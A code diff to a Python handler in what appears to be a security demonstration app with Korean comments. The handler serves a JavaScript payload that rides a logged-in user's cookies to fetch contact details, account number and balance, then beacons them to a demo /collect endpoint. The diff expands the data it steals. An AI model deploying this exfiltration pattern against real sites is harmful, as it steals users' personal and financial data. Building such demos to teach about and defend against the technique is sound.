@@ -105,15 +105,20 @@ def _api_origin(request: Request) -> str:
 def exfil_script(request: Request) -> Response:
     """S2 숨은 코드가 import로 불러가는 유출 스크립트.
 
-    OFF 화면(app.도메인)에서 실행된다. httpOnly 쿠키는 못 읽지만, credentials:'include'로
-    백엔드 /api/me를 (쿠키와 함께) 교차출처 호출해 연락처를 읽고 /collect로 보낸다.
+    OFF 화면(app.도메인)에서 실행된다. httpOnly 쿠키 자체는 못 읽지만, credentials:'include'로
+    백엔드 /api/me(연락처)와 /api/accounts/me(계좌번호·잔액)를 쿠키와 함께 호출해 통째로 빼내 /collect로 보낸다.
+    비밀번호는 어떤 API로도 내려오지 않아(해시로만 저장) 이 방식으론 탈취되지 않는다.
     """
     api = _api_origin(request)
     script = (
-        f"fetch('{api}/api/me',{{credentials:'include'}}).then(r=>r.json()).then(d=>{{"
-        f"new Image().src='{api}/api/demo/collect?d='+encodeURIComponent(JSON.stringify({{email:d.email,phone:d.phone}}));"
-        "});\n"
-    )
+        "Promise.all(["
+        "fetch('__API__/api/me',{credentials:'include'}).then(r=>r.json()),"
+        "fetch('__API__/api/accounts/me',{credentials:'include'}).then(r=>r.json())"
+        "]).then(function(a){var me=a[0],ac=a[1];"
+        "new Image().src='__API__/api/demo/collect?d='+encodeURIComponent(JSON.stringify("
+        "{name:me.name,email:me.email,phone:me.phone,account_no:ac.account_no,balance:ac.balance}"
+        "));});\n"
+    ).replace("__API__", api)
     # 교차출처 모듈 import와 수집 요청을 허용. CSP(connect/img/script-src)가 우리 백엔드만 허용하므로
     # 외부로는 못 나간다.
     return Response(
